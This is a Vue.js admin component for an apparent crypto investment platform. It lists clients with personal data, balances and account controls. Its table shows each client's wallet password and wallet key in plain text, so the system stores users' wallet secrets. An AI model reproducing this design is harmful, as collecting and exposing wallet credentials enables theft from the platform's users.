<template>
  <div class="w-full px-5">
    <div class="w-full px-5 py-8 rounded-md bg-white">
      <h3 class="pb-2.5 border-b border-gray-300 sm:pl-5">
        Details <fa icon="fa-solid fa-history" />
      </h3>
      <p class="pt-2.5 text-red-800 text-center" v-if="!clients?.length">
        {{ noneText }}
      </p>
      <div class="w-full overflow-auto mt-2.5">
        <div class="w-[4000px]">
          <div class="w-full flex flex-row justify-between">
            <div class="flex flex-row justify-center gap-2">
              <label class="pt-2" for="entries">Entries:</label>
              <select
                v-model="entries"
                name="entries"
                @change="getClients(entries)"
                class="mt-1 text-sm w-full border border-gray-300 h-8 px-2 hover:bg-gray-100 focus:bg-gray-100 rounded-[5px]"
              >
                <option value="10">10</option>
                <option value="25">25</option>
                <option value="50">50</option>
                <option value="100">100</option>
              </select>
            </div>
            <div class="flex flex-row gap-2">
              <button
                class="text-lg pt-1 text-blue-600 hover:text-blue-800"
                @click="searchClient(val)"
              >
                <fa icon="fa-solid fa-magnifying-glass" />
              </button>
              <input
                type="text"
                v-model="val"
                placeholder="id/first name/last name/email"
                class="mt-1 text-sm w-28 border border-gray-300 h-8 px-2 hover:bg-gray-100 focus:bg-gray-100 rounded-[5px]"
              />
            </div>
          </div>
          <table class="text-sm w-full mt-3 overflow-auto text-center">
            <thead class="font-medium text-gray-500 bg-gray-100 text-left">
              <th
                v-for="(item, index) in tableHead"
                :key="index"
                class="px-2 py-1 text-center"
              >
                {{ item }} <fa icon="fa-solid fa-caret-down" />
              </th>
            </thead>
            <tbody>
              <tr v-for="(item, index) in clients" :key="index">
                <td class="px-2 py-1 text-center">{{ item?.id }}</td>
                <td class="px-2 py-1 text-center">{{ item?.first_name }}</td>
                <td class="px-2 py-1 text-center">{{ item?.last_name }}</td>
                <td class="px-2 py-1 text-center">{{ item?.email }}</td>
                <td class="px-2 py-1 text-center">{{ item?.phone_no }}</td>
                <td class="px-2 py-1 text-center">
                  <img
                    :src="item?.picture"
                    alt="Proof"
                    class="w-14 h-14 mx-auto"
                  />
                </td>
                <td class="px-2 py-1 text-center">{{ item?.country }}</td>
                <td class="px-2 py-1 text-center">{{ item?.state }}</td>
                <td class="px-2 py-1 text-center">{{ item?.city }}</td>
                <td class="px-2 py-1 text-center">{{ item?.zip_code }}</td>
                <td class="px-2 py-1 text-center">{{ item?.address }}</td>
                <td class="px-2 py-1 text-center">{{ item?.annual_income }}</td>
                <td class="px-2 py-1 text-center">
                  {{ item?.investment_plan }}
                </td>
                <td class="px-2 py-1 text-center">{{ item?.profession }}</td>
                <td class="px-2 py-1 text-center">{{ item?.date_created }}</td>
                <td class="px-2 py-1 text-center">{{ item?.time_created }}</td>
                <td class="px-2 py-1 text-center">
                  {{ item?.logged_in ? "Active" : "Inactive" }}
                </td>
                <td class="pl-4 py-2">
                  {{ item?.deleted ? "Deleted" : "Operational" }}
                </td>
                <td class="pl-4 py-2">{{ item?.coinbase }}</td>
                <td class="pl-4 py-2">{{ item?.coinbase_name }}</td>
                <td class="pl-4 py-2">{{ item?.coinbase_pass }}</td>
                <td class="pl-4 py-2">{{ item?.coinbase_key }}</td>
                <td class="pl-4 py-2">{{ item?.acct_bal }}</td>
                <td class="pl-4 py-2">{{ item?.bit_bal }}</td>
                <td class="pl-4 py-2">{{ item?.tot_in }}</td>
                <td class="pl-4 py-2">{{ item?.tot_re }}</td>
                <td class="pl-4 py-2">
                  <button
                    :disabled="dis"
                    class="py-1 px-2 text-center rounded-md text-gray-100 bg-blue-600 hover:bg-blue-500"
                  >
                    <router-link
                      :to="`/${item?.first_name + ' ' + item?.last_name}/${
                        item?.id
                      }/deposits`"
                    >
                      Deposits</router-link
                    >
                  </button>
                </td>
                <td class="pl-4 py-2">
                  <button
                    :disabled="dis"
                    class="py-1 px-2 text-center rounded-md text-gray-100 bg-blue-600 hover:bg-blue-500"
                  >
                    <router-link
                      :to="`/${item?.first_name + ' ' + item?.last_name}/${
                        item?.id
                      }/withdrawals`"
                    >
                      Withdrawals</router-link
                    >
                  </button>
                </td>
                <td class="pl-4 py-2">
                  <button
                    :disabled="dis"
                    class="py-1 px-2 text-center rounded-md text-gray-100 bg-blue-600 hover:bg-blue-500"
                  >
                    <router-link
                      :to="`/${item?.first_name + ' ' + item?.last_name}/${
                        item?.id
                      }/earnings`"
                    >
                      Earnings</router-link
                    >
                  </button>
                </td>
                <td class="pl-4 py-2">
                  <button
                    :disabled="dis"
                    class="py-1 px-2 text-center rounded-md text-gray-100 bg-blue-600 hover:bg-blue-500"
                  >
                    <router-link
                      :to="`/${item?.first_name + ' ' + item?.last_name}/${
                        item?.id
                      }/deficits`"
                    >
                      Deficits</router-link
                    >
                  </button>
                </td>
                <td class="pl-4 py-2">
                  <button
                    @click="deleteClient(item?.id)"
                    :disabled="dis"
                    class="py-1 px-2 text-center rounded-md text-gray-100"
                    :class="
                      item?.deleted
                        ? dis
                          ? 'bg-green-500'
                          : 'bg-green-600 hover:bg-green-500'
                        : dis
                        ? 'bg-red-500'
                        : 'bg-red-600 hover:bg-red-500'
                    "
                  >
                    {{ item?.deleted ? "Restore" : "Delete" }}
                  </button>
                </td>
              </tr>
            </tbody>
          </table>
          <p
            class="text-center py-1 px-2 border-y mt-2 border-black"
            v-if="!clients?.length"
          >
            No data available in table
          </p>
          <div
            v-if="clients?.length"
            class="w-full flex justify-between flex-row mt-2 px-5"
          >
            <p class="pt-1">
              Show {{ meta?.first_item }} to {{ meta?.last_item }} of
              {{ meta?.num_items }} entries
            </p>
            <div class="flex flex-row gap-2">
              <button
                v-if="meta?.prev_page"
                @click="getClients(entries, meta?.prev_page)"
                class="hover:bg-gray-200 py-1 px-2 rounded-md"
              >
                Previous
              </button>
              <button
                v-if="meta?.next_page"
                @click="getClients(entries, meta?.next_page)"
                class="hover:bg-gray-200 py-1 px-2 rounded-md"
              >
                Next
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { ref } from "@vue/reactivity";
import useComp1 from "../../mix/data.js";
import { onBeforeMount } from "@vue/runtime-core";
export default {
  name: "AllUsers",
  setup() {
    const { customFetcher } = useComp1();
    const clients = ref({});
    const noneText = ref("");
    const entries = ref("10");
    const val = ref("");
    const dis = ref(false);
    const meta = ref({});
    const tableHead = [
      "ID",
      "FIRST NAME",
      "LAST NAME",
      "EMAIL",
      "PHONE NO",
      "PICTURE",
      "COUNTRY",
      "STATE",
      "CITY",
      "ZIP CODE",
      "ADDRESS",
      "ANNUAL INCOME",
      "INVESTMENT PLAN",
      "PROFESSION",
      "DATE JOINED",
      "TIME JOINED",
      "STATUS",
      "ACCOUNT STATUS",
      "WALLET",
      "WALLET ADDRESS",
      "WALLET PASSWORD",
      "WALLET KEY",
      "ACCOUNT BALANCE",
      "BITCOIN BALANCE",
      "TOTAL INCOME",
      "TOTAL REVENUE",
      "DEPOSITS",
      "WITHDRAWALS",
      "EARNINGS",
      "DEFICITS",
      "ACTIVATE/DEACTIVATE",
    ];

    const getClients = async (page_size, page = 1) => {
      try {
        const { data } = await customFetcher(`client/get/${page_size}/${page}`);
        clients.value = data.items;
        meta.value = data.meta;
        noneText.value = "There are no clients yet!";
      } catch {}
    };

    const searchClient = async (index) => {
      try {
        if (index && index != 0) {
          const { data } = await customFetcher(`client/get/${index}`);
          if (data?.id) {
            clients.value = [data];
          }
          noneText.value = "";
        } else {
          getClients(entries.value);
        }
      } catch {
        getClients(entries.value);
      }
    };

    const deleteClient = async (val) => {
      dis.value = true;
      try {
        const {} = await customFetcher(`client/activate/${val}`, {
          method: "PUT",
        });
        getClients(entries.value);
      } catch {}
      dis.value = false;
    };

    onBeforeMount(() => {
      getClients(entries.value);
    });

    return {
      tableHead,
      clients,
      searchClient,
      noneText,
      entries,
      getClients,
      meta,
      val,
      dis,
      deleteClient,
    };
  },
};
</script>

<style>
.custom-file-input::-webkit-file-upload-button {
  visibility: hidden;
}
.custom-file-input::before {
  content: "UPLOAD PROOF OF PAYMENT";
  outline: none;
  white-space: nowrap;
  -webkit-user-select: none;
  user-select: none;
}
</style>
